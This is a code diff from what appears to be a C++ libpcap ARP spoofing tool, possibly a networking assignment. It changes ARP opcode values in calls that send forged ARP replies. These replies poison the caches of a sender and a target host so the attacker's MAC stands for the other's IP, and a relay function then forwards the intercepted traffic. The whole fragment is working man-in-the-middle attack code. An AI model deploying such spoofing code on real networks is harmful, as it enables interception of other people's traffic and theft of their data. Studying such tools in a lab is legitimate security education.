@@ -45,9 +45,9 @@ int main(int argc, char *argv[])
 	{
 		argv_ip(argv[2 * i + 2], targets[i].sender_ip);
 		argv_ip(argv[2 * i + 3], targets[i].target_ip);
-		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].target_ip, 0);
+		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].target_ip, htons(ArpHdr::Request));
 		reply(dev, pcap, targets[i].target_mac, targets[i].target_ip);
-		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].sender_ip, 0);
+		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].sender_ip, htons(ArpHdr::Request));
 		reply(dev, pcap, targets[i].sender_mac, targets[i].sender_ip);
 		printf("flow %d info\n", i);
 		printf("attacker ip addr : ");
@@ -63,8 +63,8 @@ int main(int argc, char *argv[])
 		printf("target mac addr : ");
 		print_mac(targets[i].target_mac);
 		printf("=============================\n\n");
-		request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, 1);
-		request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, 1);
+		request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, htons(ArpHdr::Reply));
+		request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, htons(ArpHdr::Reply));
 	}
 	relay(dev, pcap, attacker_mac, targets, count);
 	pcap_close(pcap);
